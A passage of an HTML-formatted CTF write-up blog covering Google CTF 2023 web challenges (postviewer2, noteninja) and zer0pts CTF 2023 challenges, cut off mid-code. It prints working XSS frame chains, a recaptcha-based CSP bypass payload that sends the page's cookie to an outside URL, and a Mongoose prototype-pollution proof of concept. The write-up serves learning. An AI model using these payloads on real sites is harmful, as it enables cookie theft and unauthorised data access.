parameter">resolve</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>      <span class="token keyword">let</span> brokenFrame <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"iframe"</span><span class="token punctuation">)</span>      url <span class="token operator">=</span> <span class="token string">'https://sbx-gggg.postviewer2-web.2023.ctfcompetition.com/bomb'</span>      brokenFrame<span class="token punctuation">.</span>src <span class="token operator">=</span> url      brokenFrame<span class="token punctuation">.</span>sandbox <span class="token operator">=</span> <span class="token string">'allow-modals allow-scripts allow-top-navigation allow-same-origin'</span>      brokenFrame<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'load'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'brokenFrame loaded'</span><span class="token punctuation">)</span>        <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">once</span><span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      brokenFrame<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'brokenFrame error'</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span>        <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">once</span><span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>brokenFrame<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">function</span> <span class="token function">createXssFrame</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'createXssFrame'</span><span class="token punctuation">)</span>    window<span class="token punctuation">.</span>xssFrame <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"iframe"</span><span class="token punctuation">)</span>    url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token string">"https://sbx-gggg.postviewer2-web.2023.ctfcompetition.com/shim.html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    url<span class="token punctuation">.</span>searchParams<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'o'</span><span class="token punctuation">,</span> window<span class="token punctuation">.</span>origin<span class="token punctuation">)</span><span class="token punctuation">;</span>    xssFrame<span class="token punctuation">.</span>src <span class="token operator">=</span> url    xssFrame<span class="token punctuation">.</span>sandbox <span class="token operator">=</span> <span class="token string">'allow-modals allow-scripts allow-top-navigation allow-same-origin'</span>    xssFrame<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">            const blob = new Blob(['&lt;html>&lt;head>&lt;script src="YOUR PAYLOAD HERE" />&lt;script>alert(1)&lt;/scr' + 'ipt>&lt;/head>&lt;body>&lt;div />&lt;/body>&lt;/html>'], &#123;                type: 'text/html'            &#125;);            url = URL.createObjectURL(blob)            console.log(url)            window.top.location = url    </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>    xssFrame<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'load'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'xss frame loaded'</span><span class="token punctuation">)</span>      window<span class="token punctuation">.</span>xssFrame<span class="token punctuation">.</span>contentWindow<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        <span class="token literal-property property">body</span><span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">          &lt;script>            top.frames[1].document.open()            console.log('writing');            console.log('&lt;script>' + window.parent.name + '&lt;/scr' + 'ipt>');            top.frames[1].document.write('&lt;script>' + window.parent.name + '&lt;/scr' + 'ipt>')          &lt;\/script></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token literal-property property">mimeType</span><span class="token operator">:</span> <span class="token string">"text/html"</span><span class="token punctuation">,</span> <span class="token literal-property property">sandbox</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"allow-modals"</span><span class="token punctuation">,</span> <span class="token string">"allow-scripts"</span><span class="token punctuation">,</span> <span class="token string">"allow-top-navigation"</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"allow-same-origin"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"allow-same-origin"</span><span class="token punctuation">]</span><span class="token punctuation">]</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token string">"*"</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">once</span><span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>xssFrame<span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">createBombFrame</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"sleeping"</span><span class="token punctuation">)</span>    <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">2000</span><span class="token punctuation">)</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"creating broken frame"</span><span class="token punctuation">)</span>    <span class="token keyword">await</span> <span class="token function">createBrokenFrame</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token function">createXssFrame</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span>  window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'message'</span><span class="token punctuation">,</span> <span class="token parameter">e</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'got message'</span><span class="token punctuation">,</span> e<span class="token punctuation">,</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'load'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>The main purpose of doing all these steps is just to load the main domain as an iframe, that’s it.</p><p>However, we encountered a roadblock and couldn’t bypass this part:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">previewIframe</span><span class="token punctuation">(</span>body<span class="token punctuation">,</span> mimeType<span class="token punctuation">,</span> shimUrl<span class="token punctuation">,</span> container<span class="token punctuation">,</span> sandbox <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'allow-scripts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>shimUrl<span class="token punctuation">)</span><span class="token punctuation">;</span>    url<span class="token punctuation">.</span>host <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">sbx-</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">generateRandomPart</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>url<span class="token punctuation">.</span>host<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>    url<span class="token punctuation">.</span>searchParams<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'o'</span><span class="token punctuation">,</span> window<span class="token punctuation">.</span>origin<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> iframe <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'iframe'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    iframe<span class="token punctuation">.</span>src <span class="token operator">=</span> url<span class="token punctuation">;</span>    container<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>iframe<span class="token punctuation">)</span><span class="token punctuation">;</span>    iframe<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'load'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        iframe<span class="token punctuation">.</span>contentWindow<span class="token operator">?.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> body<span class="token punctuation">,</span> mimeType<span class="token punctuation">,</span> sandbox<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> url<span class="token punctuation">.</span>origin<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">once</span><span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>We don’t know what the random domain is, so we can’t use postMessage as it will be blocked. It would be easier if we knew the random domain.</p><p>We searched through various specifications, looked at Chromium source code and bug tracker, but made little progress. The closest we found was this: <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1359122&q=subdomain%20host%20leak&can=1">Issue 1359122: Security: SOP bypass leaks navigation history of iframe from other subdomain if location changed to about:blank</a>, which is what we needed, but it has already been fixed.</p><p>Just ten minutes before the end of the competition, my teammate found the <a href="https://developer.mozilla.org/en-US/docs/Web/API/Location/ancestorOrigins">location.ancestorOrigins</a> property, and I realized that the child iframe can access the ancestor’s origin, which I had never noticed before (even though it’s the first property of the location object…).</p><p>Due to time constraints, we couldn’t complete it in the end, only a few steps were left.</p><p>The next step is to redirect the iframe with the flag to our prepared blob page, which can leak the sandbox domain using <code>location.ancestorOrigins</code>:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">top<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token constant">URL</span><span class="token punctuation">.</span><span class="token function">createObjectURL</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Blob</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'&lt;script>top.postMessage(location.ancestorOrigins[0],"*")&lt;\/script>'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'text/html'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Once we have the sandbox domain, we can obtain XSS on this domain. After obtaining XSS, we can access the sandbox domain. Although the location of the iframe has changed, the src of the iframe remains the same, so we can directly access the blob src with the flag. After that, we just need to fetch it to obtain the flag.</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">fetch</span><span class="token punctuation">(</span>top<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'iframe'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>src<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>It could have been done in just a few hours initially, what a pity.</p><p>Here is the author’s exploit, worth learning: <a href="https://github.com/google/google-ctf/blob/master/2023/web-postviewer2/solution/solve.html">https://github.com/google/google-ctf/blob/master/2023/web-postviewer2/solution/solve.html</a></p><h3><span id="noteninja-3-solves">NOTENINJA (3 solves)</span></h3><p>Basically, you can insert any HTML in this challenge, but the key point is the CSP: <code>script-src &#39;self&#39; https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/;</code></p><p>Initially, I thought this challenge used Next.js and would be similar to the approach used in <a href="https://blog.huli.tw/2022/08/21/en/corctf-2022-modern-blog-writeup/">corCTF 2022</a>. However, I tried for a long time but couldn’t figure it out. Only after the competition did I realize that this challenge was just about finding the CSP gadget for recaptcha…</p><p>Inside the recaptcha website, there is an Angular that can be used as a gadget. So the final solution is:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">++++++++++++++++++++++++++++++++++++++<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span>  <span class="token attr-name">ng-controller</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>CarouselController as c<span class="token punctuation">"</span></span>  <span class="token attr-name">ng-init</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>c.init()<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>&amp;#91[c.element.ownerDocument.defaultView.parent.location="http://google.com?"+c.element.ownerDocument.cookie]]<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">carousel</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">slides</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://www.google.com/recaptcha/about/js/main.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>++++++++++++++++++++++++++++++++++++++<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>It’s also a less-known CSP bypass that I learned.</p><p>Also, another team found a Mongoose 0day vulnerability: <a href="https://huntr.dev/bounties/1eef5a72-f6ab-4f61-b31d-fc66f5b4b467/">Mongoose Prototype Pollution Vulnerability in automattic&#x2F;mongoose</a></p><p>The reason is in this line of code: <a href="https://github.com/google/google-ctf/blob/master/2023/web-noteninja/challenge/src/pages/api/notes/%5Bid%5D.js#L74">https://github.com/google/google-ctf/blob/master/2023/web-noteninja/challenge/src/pages/api/notes/%5Bid%5D.js#L74</a></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">await</span> Note<span class="token punctuation">.</span><span class="token function">findByIdAndUpdate</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token operator">...</span>req<span class="token punctuation">.</span>body<span class="token punctuation">,</span> <span class="token literal-property property">htmlDescription</span><span class="token operator">:</span> htmlDescription <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>It directly takes in the entire body, and then you can create a prototype pollution through <code>$rename</code>:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">import</span> <span class="token punctuation">&#123;</span> connect<span class="token punctuation">,</span> model<span class="token punctuation">,</span> Schema <span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">'mongoose'</span><span class="token punctuation">;</span><span class="token keyword">await</span> <span class="token function">connect</span><span class="token punctuation">(</span><span class="token string">'mongodb://127.0.0.1:27017/exploit'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> Example <span class="token operator">=</span> <span class="token function">model</span><span class="token punctuation">(</span><span class="token string">'Example'</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Schema</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">hello</span><span class="token operator">:</span> String <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> example <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token keyword">new</span> <span class="token class-name">Example</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">hello</span><span class="token operator">:</span> <span class="token string">'world!'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">await</span> Example<span class="token punctuation">.</span><span class="token function">findByIdAndUpdate</span><span class="token punctuation">(</span>example<span class="token punctuation">.</span>_id<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>    <span class="token literal-property property">$rename</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token literal-property property">hello</span><span class="token operator">:</span> <span class="token string">'__proto__.polluted'</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// this is what causes the pollution</span><span class="token keyword">await</span> Example<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> test <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>test<span class="token punctuation">.</span>polluted<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// world!</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// [Object: null prototype] &#123; polluted: 'world!' &#125;</span>process<span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>With this prototype pollution vulnerability, you can use <code>find()</code> to dump all the data and see other people’s notes.</p><h2><span id="zer0ptsctf-2023">zer0ptsCTF 2023</span></h2><p>Let me provide a few references first:</p><ol><li><a href="https://nanimokangaeteinai.hateblo.jp/entry/2023/07/17/101119">zer0pts CTF writeup (in English)</a></li><li><a href="https://blog.arkark.dev/2023/07/17/zer0pts-ctf/">zer0pts CTF 2023 writeup (4 web challs)</a></li><li><a href="https://blog.maple3142.net/2023/07/16/zer0pts-ctf-2023-writeups/">zer0pts CTF 2023 Writeups</a></li></ol><p>The complete code for each challenge is available here: <a href="https://github.com/zer0pts/zer0pts-ctf-2023-public/tree/master/web">https://github.com/zer0pts/zer0pts-ctf-2023-public/tree/master/web</a></p><h3><span id="warmuprofile-48-solves">Warmuprofile (48 solves)</span></h3><p>This challenge is quite interesting. You can add and delete users, and the goal is to create an admin user. However, the admin user already exists, so you need to find a way to delete it.</p><p>The code for deletion is as follows:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/user/:username/delete'</span><span class="token punctuation">,</span> needAuth<span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> username <span class="token punctuation">&#125;</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>params<span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">username</span><span class="token operator">:</span> loggedInUsername <span class="token punctuation">&#125;</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>session<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>loggedInUsername <span class="token operator">!==</span> <span class="token string">'admin'</span> <span class="token operator">&amp;&amp;</span> loggedInUsername <span class="token operator">!==</span> username<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">flash</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> <span class="token string">'general user can only delete itself'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// find user to be deleted</span>    <span class="token keyword">const</span> user <span class="token operator">=</span> <span class="token keyword">await</span> User<span class="token punctuation">.</span><span class="token function">findOne</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        <span class="token literal-property property">where</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> username <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">await</span> User<span class="token punctuation">.</span><span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        <span class="token literal-property property">where</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token operator">...</span>user<span class="token operator">?.</span>dataValues <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// user is deleted, so session should be logged out</span>    req<span class="token punctuation">.</span>session<span class="token punctuation">.</span><span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>If you look closely and think about it, you will notice a problem here.</p><p>The problem is that if you log in with two tabs at the same time, both sessions will have a username. Then, if you delete a user on one page and perform the same operation on the other page after deletion, <code>User.findOne</code> will return <code>null</code> because the user no longer exists in the database. When it reaches <code>User.destroy</code>, it becomes <code>where: &#123;&#125;</code>, which deletes everything in the database, including the admin.</p><h3><span id="jqi-40-solves">jqi (40 solves)</span></h3><p>In this challenge, you can execute corresponding jq commands based on the conditions you set. It was through this challenge that I discovered the many functionalities of jq.</p><p>The main code is this part:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token constant">KEYS</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">,</span> <span class="token string">'tags'</span><span class="token punctuation">,</span> <span class="token string">'author'</span><span class="token punctuation">,</span> <span class="token string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>fastify<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/api/search'</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">request<span class="token punctuation">,</span> reply</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> keys <span class="token operator">=</span> <span class="token string">'keys'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>query <span class="token operator">?</span> request<span class="token punctuation">.</span>query<span class="token punctuation">.</span>keys<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token constant">KEYS</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> conds <span class="token operator">=</span> <span class="token string">'conds'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>query <span class="token operator">?</span> request<span class="token punctuation">.</span>query<span class="token punctuation">.</span>conds<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>keys<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">10</span> <span class="token operator">||</span> conds<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> reply<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">error</span><span class="token operator">:</span> <span class="token string">'invalid key or cond'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// build query for selecting keys</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> key <span class="token keyword">of</span> keys<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token constant">KEYS</span><span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> reply<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">error</span><span class="token operator">:</span> <span class="token string">'invalid key'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">const</span> keysQuery <span class="token operator">=</span> keys<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">key</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token 